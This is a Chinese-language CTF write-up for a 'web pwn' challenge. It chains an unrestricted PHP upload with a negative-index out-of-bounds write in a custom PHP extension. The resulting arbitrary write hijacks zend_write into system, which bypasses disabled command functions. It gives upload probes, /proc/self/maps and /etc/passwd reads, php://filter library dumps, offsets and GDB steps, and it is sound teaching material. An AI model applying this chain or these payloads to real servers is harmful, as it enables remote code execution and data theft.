# pwn-ph Writeup

## 题目定位

这题不是传统意义上的纯 Web，也不是传统意义上的单 ELF pwn。
更准确地说，它是一个“Web 入口的 pwn”：

1. Web 层给了我一个非常强的入口，可以任意上传 PHP 到 Web 根并直接执行。
2. 但远端把常见命令执行函数全禁掉了，导致我不能停在一句话木马这里。
3. 真正把链打通的关键在自定义 PHP 扩展 `vuln.so`，那里有内存破坏漏洞。

所以这题最合理的分类是：

1. 如果按入口看，是 `web pwn`
2. 如果按漏洞本质看，是 `pwn`

这题每次重开实例 flag 都会变。本文示例实例打通后拿到的是：

```text
polarisctf{3d83c9ac-7aee-4422-a4b0-fbad4f542bf6}
```

## 一、初探与信息收集

### 1. 先看上传入口

我拿到题目后第一眼先看 `attachments/index.php`，而不是先上 IDA。
因为这个题的入口明显是一个上传页，先把 Web 层能力摸清楚，后面分析 `vuln.so` 才知道自己到底缺什么。

核心逻辑只有几行：

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        $file = $_FILES['file'];

        $upload_dir = '';
        $target_file = $upload_dir . basename($file['name']);

        $result = move_uploaded_file($file['tmp_name'], $target_file);
```

这里一下就能看出两个关键信息：

1. `upload_dir = ''`，说明上传文件直接落在当前目录，也就是 Web 根。
2. 只做了 `basename()`，没有后缀限制，也没有禁止上传 `.php`。

所以我第一时间的判断就是：

1. 这题可以任意上传 PHP。
2. 上传后的文件应该可以通过 `/文件名.php` 直接访问。

这一步很重要，因为它决定了我后面不是“想办法把漏洞打成代码执行”，而是“我已经有稳定 PHP 执行入口，只差把它桥接成系统命令执行”。

### 2. 远端怎么实测“能执行 PHP”

最简单的办法就是先上传一个最小探针：

```php
<?php echo "OK"; ?>
```

然后访问上传后的文件。
如果页面直接返回 `OK`，那就说明三件事同时成立：

1. 上传真的成功落到了 Web 根。
2. 上传的 `.php` 会被 Apache + mod_php 解析。
3. 这不是单纯文件落地，而是稳定 PHP 代码执行。

实际我就是这么测的，最短命令如下：

```bash
cat > /tmp/a.php <<'PHP'
<?php echo "OK"; ?>
PHP

curl -s -F 'file=@/tmp/a.php;filename=a.php' \
'http://target/index.php' | grep '文件上传成功'

curl -s 'http://target/a.php'
```

如果第二条输出是：

```text
OK
```

那这一步就验证完了。

### 3. 远端怎么实测“system/exec/shell_exec 被禁了”

同样很直接，也是传最小探针。
我一般会分别测：

```php
<?php system("id"); ?>
```

```php
<?php exec("id"); ?>
```

```php
<?php shell_exec("id"); ?>
```

上传以后分别访问。
如果页面返回类似：

```text
Fatal error: Uncaught Error: Call to undefined function system()
```

那就说明这个函数在当前环境里已经不可用。

这一步的意义是：

1. 我确认了 PHP 上传执行是通的。
2. 但常规一句话木马走不通。
3. 所以后面必须回到 `vuln.so`，把“PHP 代码执行”继续升级成“命令执行”。

### 4. 再看运行环境

接着我会看 `attachments/start.sh` 和 `attachments/Dockerfile`。
这两份文件比 `index.php` 还关键，因为它们会告诉我最终目标到底是什么。

`start.sh` 里有：

```bash
echo $FLAG > /flag
chmod 400 /flag
```

`Dockerfile` 里有：

```dockerfile
COPY ./readflag /
RUN chmod au+sx /readflag
```

这说明：

1. `/flag` 是 `400` 权限，普通 PHP 进程读不到。
2. 但题目专门放了一个 SUID 的 `/readflag`。

所以题目的真正目标不是“直接读 `/flag`”，而是：

1. 想办法在远端执行 `/readflag`
2. 再把它的输出带回 Web 根

### 5. 再看 `php.ini`

接下来我会确认 PHP 扩展有没有真的加载，以及环境里大概禁了什么。

`php.ini` 里最关键的一行是：

```ini
extension = vuln.so
```

这说明：

1. `vuln.so` 一定会进 PHP 进程
2. 题目的核心洞基本就在这

另外远端实测还能确认：

1. `system`
2. `exec`
3. `shell_exec`
4. `passthru`
5. `mail`
6. `ini_get`
7. `var_dump`

这些常见函数都已经不太能指望。

但下面这些还活着：

1. `include`
2. `require`
3. `echo`
4. `apache_get_modules`

这就足够了。

### 6. 这题里 `checksec` 应该看什么

很多人拿到 `.so` 第一下会跑 `checksec`，这没问题，但这题不能只盯着 `checksec`。

如果对 `vuln.so` 跑 `checksec`，我真正关心的是这几项：

1. `PIE`
2. `NX`
3. `RELRO`

解释如下：

1. `PIE enabled`
   - 说明 `vuln.so` 基址随机
   - 不能把 `0x40a0/0x41c0` 这种静态地址直接拿去远端用
   - 所以后面必须先 leak base

2. `NX enabled`
   - 说明不要想当然走 shellcode
   - 不过这题本来也不是 shellcode 路线

3. `Partial RELRO`
   - 说明某些 GOT/指针理论上仍然可写
   - 但这题其实更顺的点不是打 `vuln.so` 自己的 GOT，而是劫持 `libphp.so` 的 `zend_write`

4. `Canary`
   - 对这题帮助不大
   - 因为这题不是栈溢出返回地址，不靠 smash stack

所以这题的 `checksec` 只负责告诉我一个大的方向：

1. 地址随机，需要先泄露
2. 不能靠 shellcode
3. 更像是“数据改写 / 函数指针劫持”题

真正的主线还是：

1. `readelf -r`
2. IDA 看 `zif_add / zif_edit / zif_delete`
3. `/proc/self/maps` 泄露实际基址

## 二、IDA 里应该怎么分析

### 1. 先看导出函数

我把 `vuln.so` 丢进 IDA 以后，第一步不是直接啃反编译，而是先看导出符号。

我关心这些名字：

1. `get_module`
2. `zif_test1`
3. `zif_test2`
4. `zif_add`
5. `zif_edit`
6. `zif_delete`

我的经验是：

1. `test1/test2` 这种名字大概率只是烟雾弹或功能展示
2. `add/edit/delete` 这组三件套才最像真正的洞点

所以真正该优先分析的是：

1. `zif_add`
2. `zif_edit`
3. `zif_delete`

### 2. 再给全局变量改名

这题里有三个全局对象必须先认出来：

1. `vuln_module_entry`
2. `heap_size`
3. `heap`

我会先把它们的地址记下来：

```text
vuln_module_entry = 0x40a0
heap_size         = 0x4180
heap              = 0x41c0
```

这是后面算负索引、算偏移、解释为什么选 `-64` 的基础。

### 3. 再看 `zif_add / zif_edit / zif_delete`

这三个函数的逻辑很直白，反编译以后大概会恢复成这样。

`add(idx, size)`：

```c
if (idx > 0xf) return;
if (heap[idx] != NULL) {
    php_printf("Index %d is already allocated\r\n", idx);
    return;
}
heap[idx] = _emalloc(size);
heap_size[idx] = size;
```

`edit(idx, data)`：

```c
if (idx > 0xf) return;
if (heap[idx] == NULL) {
    php_printf("Index %d is not allocated\r\n", idx);
    return;
}
if (strlen(data) > heap_size[idx]) {
    php_printf("Data size exceeds allocated size\r\n");
    return;
}
memcpy(heap[idx], data, strlen(data));
```

`delete(idx)`：

```c
if (idx > 0xf) return;
if (heap[idx] == NULL) {
    php_printf("Index %d is not allocated\r\n", idx);
    return;
}
_efree(heap[idx]);
```

### 4. 这时候我会盯哪一行

最该盯的就是这句：

```c
if (idx > 0xf) return;
```

因为它只检查了上界，没有检查下界。

也就是说：

1. `idx = 0 ~ 15` 能过
2. `idx = -1, -2, -64` 这种负数也能过

这就不是正常数组访问了，而是负索引 OOB。

### 5. 还要补看什么

这题只看反编译还不够，必须再补一眼重定位表：

```bash
readelf -r vuln.so
```

原因很简单：

1. `heap[-64]` 最后会落到 `0x3fc0`
2. 这个地址到底运行时指向什么，要看重定位

而重定位表里正好有：

```text
0x3fc0 -> R_X86_64_GLOB_DAT -> vuln_module_entry
0x3fc8 -> R_X86_64_GLOB_DAT -> heap
0x3fd0 -> R_X86_64_GLOB_DAT -> heap_size
```

这一步是整题最关键的穿针引线。

## 三、漏洞到底在哪里

这题的核心洞只有一个：

```text
只检查 idx <= 15，没有检查 idx >= 0
```

于是：

1. `heap[idx]` 可以向前越界访问
2. `heap_size[idx]` 也可以向前越界访问

而 `edit()` 里最值钱的一句是：

```c
memcpy(heap[idx], data, strlen(data));
```

所以只要我能做到：

1. 把 `heap[idx]` 弄成任意地址
2. 把 `heap_size[idx]` 弄成足够大

那 `edit()` 就会从“改堆块内容”变成“任意地址写”。

换句话说，这题本质不是栈溢出，也不是 UAF，而是：

1. 负索引 OOB
2. 最终落成 `memcpy` 型 arbitrary write

## 四、为什么偏偏选 `idx = -64`

这一步是整题最容易看晕、但也最该讲清楚的地方。

`heap` 的基址是：

```text
0x41c0
```

而 `heap` 每项是 `QWORD`，也就是 8 字节。
所以：

```text
heap[-64] = *(0x41c0 - 64 * 8)
          = *(0x41c0 - 0x200)
          = *(0x3fc0)
```

而根据重定位表：

```text
0x3fc0 -> &vuln_module_entry
```

所以运行时：

```text
heap[-64] == &vuln_module_entry
```

这就意味着：

```php
edit(-64, seed)
```

实际上做的是：

```c
memcpy(&vuln_module_entry, seed, len);
```

这一下整个思路就完全顺了：

1. 我不是在乱打负索引
2. 我是借 `-64`，精准把写入起点拐到了 `vuln_module_entry`

再看长度检查：

```text
heap_size[-64] = *(0x4180 - 64 * 4)
               = *(0x4080)
```

`0x4080` 也是一块已经被重定位过的槽位，低 32 位通常够大，所以这个 `seed` 可以做得比较长，不会轻易被 `strlen(data) > heap_size[idx]` 卡死。

所以：

1. `-64` 让写入起点落到 `vuln_module_entry`
2. 长度检查又基本能过
3. 这就是把 OOB 写转成大范围全局区覆盖的关键

## 五、怎么把 OOB 写一步步拼成任意写

我的目标很简单：

```c
*(target_addr) = value;
```

做法分两步。

### 第一步：`edit(-64, seed)` 改掉 `heap[0]` 和 `heap_size[0]`

写入起点是：

```text
&vuln_module_entry = 0x40a0
```

目标位置是：

1. `heap_size[0]` 在 `0x4180`
2. `heap[0]` 在 `0x41c0`

所以相对偏移是：

```text
0x4180 - 0x40a0 = 0xe0
0x41c0 - 0x40a0 = 0x120
```

于是构造一个 `seed`：

1. `seed[0xe0:0xe4] = p32(8)`
2. `seed[0x120:0x128] = p64(target_addr)`

做完以后逻辑上就变成：

```text
heap_size[0] = 8
heap[0] = target_addr
```

### 第二步：`edit(0, p64(value))`

这时候 0 号槽已经不再指向原来的堆块，而是被我改成了 `target_addr`。
所以：

```php
edit(0, p64(value))
```

本质就是：

```c
memcpy(target_addr, &value, 8);
```

到这里，一个稳定的 8 字节任意写原语就拿到了。

## 六、为什么最后选 `zend_write`

有了 arbitrary write 以后，这题我不找 ROP，也不找 one_gadget。
因为这不是最顺的路。

这里最自然的想法是：

1. 找一个 PHP 进程里稳定会被调用的函数指针
2. 把它改成 `libc` 的 `system`
3. 再用正常 PHP 语法触发它

我最后选的是 `libphp.so` 里的全局函数指针：

```text
zend_write
```

原因很简单：

1. `echo` 最终会走 `zend_write`
2. `zend_write(str, len)` 的第一个参数就是字符串指针
3. `system(cmd)` 也只关心第一个参数 `RDI`

在 x86_64 SysV 调用约定下：

1. `zend_write(str, len)` -> `RDI = str`, `RSI = len`
2. `system(str)` -> 只看 `RDI`

所以把：

```text
zend_write -> system
```

以后，再执行：

```php
echo $_GET['c'];
```

效果就等价于：

```c
system($_GET['c']);
```

这一步很干净，因为：

1. `system()` 作为 PHP 函数虽然被禁了
2. 但我不是从 PHP 语言层调 `system()`
3. 我是在 C 层直接把函数指针改成了 `system`

这里也顺手回答一个很容易困惑的问题：

```text
这个 exp 最后有没有真正调用 /readflag？
```

答案是：

1. 调了
2. 只是它不是 Python 直接去 exec `/readflag`
3. 而是先把 `zend_write` 劫持成 `system`
4. 再通过 `echo $_GET['c']` 间接执行：`/readflag > /var/www/html/flag_xxx.txt`

## 七、远端地址和符号偏移怎么拿

### 1. 先 leak `/proc/self/maps`

因为我已经有稳定 PHP 执行入口，所以直接上传：

```php
<?php include "/proc/self/maps"; ?>
```

就能拿到当前 Apache worker 的映射。

从里面重点取三个基址：

1. `vuln.so`
2. `libphp.so`
3. `libc.so.6`

这一步其实也解释了为什么 `checksec` 在这题里只是辅助：

1. 你知道开了 PIE 没用
2. 真正能打的是直接 leak 运行时基址

### 2. 这些基址为什么能跨请求复用

因为目标环境是 Apache + mod_php。
常见情况下是：

1. 父进程先把模块映射进来
2. 再 fork worker

所以在同一个实例里，各个 worker 继承的是同一套库基址。

这也是为什么：

1. 我先用一个上传脚本泄露 `/proc/self/maps`
2. 后面再用另一个上传脚本继续打
3. 地址通常还能对得上

### 3. 再用 `php://filter` dump 动态库

如果直接：

```php
include "/usr/lib/apache2/modules/libphp.so";
```

有可能因为二进制里出现 `<?` 之类的字节触发解析，或者把输出污染得很厉害。

所以最稳的办法是：

```php
<?php include "php://filter/convert.base64-encode/resource=/usr/lib/apache2/modules/libphp.so"; ?>
```

同理还能 dump：

1. `libphp.so`
2. `libc.so.6`

然后本地 decode，再用 `ELF(...).sym` 或 `readelf -Ws` 拿符号偏移。

我实际用到的关键符号只有两个：

1. `zend_write`
2. `system`

## 八、完整利用链怎么一步步穿起来

这题我脑子里真正串的是下面这条链：

1. 先看 `index.php`
   - 确认能任意上传 PHP 到 Web 根

2. 再传探针
   - `<?php echo "OK"; ?>` 验证 PHP 执行
   - `<?php system("id"); ?>` 验证常规命令执行函数被禁

3. 再看 `start.sh / Dockerfile`
   - 确认 `/flag` 不能直接读
   - 但有 SUID 的 `/readflag`

4. 回头开 IDA 看 `vuln.so`
   - 重点分析 `zif_add / zif_edit / zif_delete`
   - 发现只查上界、不查下界
   - 得出：负索引 OOB

5. 再看全局布局和重定位
   - 算出 `heap[-64]` 会落到 `0x3fc0`
   - 再由重定位表确认 `0x3fc0 -> &vuln_module_entry`

6. 构造 arbitrary write
   - 第一次 `edit(-64, seed)` 改 `heap[0] / heap_size[0]`
   - 第二次 `edit(0, ptr)` 完成 8 字节任意写

7. 选劫持点
   - 不是找 ROP
   - 而是找 `libphp.so` 的 `zend_write`

8. 泄露和解析符号
   - `/proc/self/maps` 泄露 `vuln.so/libphp/libc` 基址
   - `php://filter` dump 远端 `libphp.so` 和 `libc.so.6`
   - 本地算 `zend_write` 和 `system`

9. 改指针并触发
   - 把 `zend_write` 改成 `system`
   - 让 `echo $_GET['c']` 实际执行命令

10. 执行 `/readflag`
   - 命令内容是：

```bash
/readflag > /var/www/html/flag_xxx.txt
```

11. 最后再读 `flag_xxx.txt`
   - flag 到手

## 九、动态调试如果卡住了该看什么

这题如果本地能起 Apache + mod_php + `vuln.so`，那最好还是挂一次 GDB，把几个关键点看透。

### 1. 先 attach 到 Apache worker

先找 PID：

```bash
ps -ef | grep apache2
```

然后：

```bash
gdb -p <pid>
```

### 2. 先看内存布局

我最先会看：

1. `vmmap`
2. `info sharedlibrary`

重点确认三个基址：

1. `vuln.so`
2. `libphp.so`
3. `libc.so.6`

### 3. 最值钱的断点下在哪

我优先会断在：

1. `zif_edit`
2. `memcpy` 调用前

本地静态偏移大概是：

1. `zif_add` 约 `0x1310`
2. `zif_edit` 约 `0x1390`
3. `zif_delete` 约 `0x1430`

所以通常会下：

```gdb
b *(vuln_base + 0x1390)
b *(vuln_base + 0x13ed)
```

第二个点最有用，因为那一下正好是 `memcpy` 前。

### 4. 到断点后重点看什么寄存器

重点看：

1. `rdi`：`memcpy` 目的地址
2. `rsi`：源地址
3. `rdx`：长度

如果我打的是第一次 `edit(-64, seed)`，那我最想确认的是：

1. `rdi` 是不是已经等于 `&vuln_module_entry`

如果我打的是第二次 `edit(0, ptr)`，那我最想确认的是：

1. `rdi` 是不是已经等于 `zend_write`

### 5. 内存该怎么观察

常用的看法就是：

```gdb
x/32gx (vuln_base + 0x40a0)
x/32gx (vuln_base + 0x4180)
x/32gx (vuln_base + 0x41c0)
```

重点观察：

1. `heap_size[0]` 有没有被改成 8
2. `heap[0]` 有没有被改成目标地址

如果装了 pwndbg，也可以：

```gdb
telescope <addr>
```

去看目标附近的指针布局。

### 6. 真卡住时最有效的招

直接给 `zend_write` 下 watchpoint。

因为整条链最后最关键的就是：

1. `edit(0, ptr)` 有没有真的把 `zend_write` 改掉

如果 watchpoint 没触发，说明：

1. seed 偏移没摆对
2. 或者目标地址算错
3. 或者 `edit(-64, seed)` 根本没成功把 0 号槽改成目标地址

## 十、exp 落地时的一个实现坑

这点是我实测时真踩到的，值得单独写一下。

如果自己用 `pwntools remote()` 手搓 HTTP，而不是直接用 `requests` / `urllib`，要注意一件事：

```text
Apache 返回的是 Transfer-Encoding: chunked
```

这意味着：

1. 你 `recvuntil("\r\n\r\n")` 之后拿到的 body，不是纯净响应体
2. 里面还带了 chunk size 头
3. 如果你直接把这个数据当作 base64 文本去 decode，再落盘成 `libphp.so` / `libc.so.6`
4. 文件就会被污染
5. `ELF(libphp_path)` 会直接报：`Magic number does not match`

所以如果脚本走 raw HTTP，一定要先 dechunk。

这一点和利用链本身无关，但和“脚本能不能真实打通”强相关。

## 十一、实际验证顺序

这题我自己认为最稳的 sanity check 顺序是：

### 1. 先验证普通文件读

上传：

```php
<?php include "/etc/passwd"; ?>
```

确认：

1. `include` 可用
2. PHP 进程能读世界可读文件

### 2. 再验证最小 PHP 执行

上传：

```php
<?php echo "OK"; ?>
```

确认：

1. 任意上传是真的
2. 上传后的 PHP 会执行

### 3. 再验证常规命令执行走不通

上传：

```php
<?php system("id"); ?>
```

确认：

1. `system()` 被禁
2. 不能停在一句话木马

### 4. 再验证函数指针劫持是否成功

在真正打 `/readflag` 前，我更喜欢先跑一个无特权命令，例如：

```bash
cp /etc/passwd /var/www/html/copy_xxx.txt
```

如果成功生成：

```text
/copy_xxx.txt
```

说明：

1. `zend_write -> system` 已经成功
2. `echo $_GET['c']` 触发成功
3. 命令执行桥已经打通

确认这一步以后，再把命令切成：

```bash
/readflag > /var/www/html/flag_xxx.txt
```

就稳得多。

## 十二、利用脚本说明

完整远端利用脚本在：

`solve_remote.py`

脚本自动做的事是：

1. 上传 `maps` 探针
2. 解析 `vuln.so/libphp/libc` 基址
3. 用 `php://filter` dump 远端 `libphp.so` 和 `libc.so.6`
4. 本地解析 `zend_write` 和 `system`
5. 上传触发脚本
6. 用 `edit(-64, seed)` + `edit(0, ptr)` 完成任意写
7. 把 `zend_write` 改成 `system`
8. 通过 `echo $_GET['c']` 间接执行 `/readflag > /var/www/html/flag_xxx.txt`
9. 最后再读回 `flag_xxx.txt`

这里再强调一次：

```text
exp 最后确实调用了 /readflag
```

只是这个调用不是 Python 直接执行，而是通过：

1. `zend_write -> system`
2. `echo $_GET['c']`

间接触发的。

## 十三、最后总结

这题最核心的一句话可以概括成：

```text
Web 任意上传给了稳定 PHP 代码执行入口，vuln.so 的负索引 OOB 给了任意写，最后把 Zend 的输出函数指针改成 system，就能执行 /readflag。
```

如果再展开一点，就是：

1. Web 层漏洞：任意上传 PHP 到 Web 根
2. 原生扩展漏洞：`add/edit/delete` 只检查 `idx <= 15`，没有检查 `idx >= 0`
3. 利用原语：`edit(-64, seed)` 重写 `heap[0]` 和 `heap_size[0]`，`edit(0, ptr)` 完成 8 字节任意写
4. 控制流劫持：把 `libphp.so` 的 `zend_write` 改成 `libc` 的 `system`
5. 收尾方式：用 `echo $_GET['c']` 触发命令执行，把 `/readflag` 输出重定向到 Web 根

如果复盘整题，我觉得最合理的做题顺序就是：

1. 先看 `index.php`
2. 确认能任意上传 PHP
3. 传 `echo OK` 和 `system("id")` 探针做环境探测
4. 再看 `start.sh / Dockerfile / php.ini`
5. 确认最终目标是执行 `/readflag`
6. 再回头开 IDA 看 `vuln.so`
7. 先分析 `zif_add / zif_edit / zif_delete`
8. 再用 `readelf -r` 把 `-64` 和 `vuln_module_entry` 串起来
9. 拼出 arbitrary write
10. 再找 PHP 进程里最顺手的函数指针 `zend_write`
11. 最后把 `echo` 变成 `system`，执行 `/readflag`

这个顺序会比一上来硬啃堆漏洞舒服很多，因为你会一直很清楚：

1. 我已经有稳定的 PHP 执行入口
2. 我真正缺的只是“从 PHP 到命令执行”的最后一座桥
3. `vuln.so` 的作用，就是把这座桥补出来
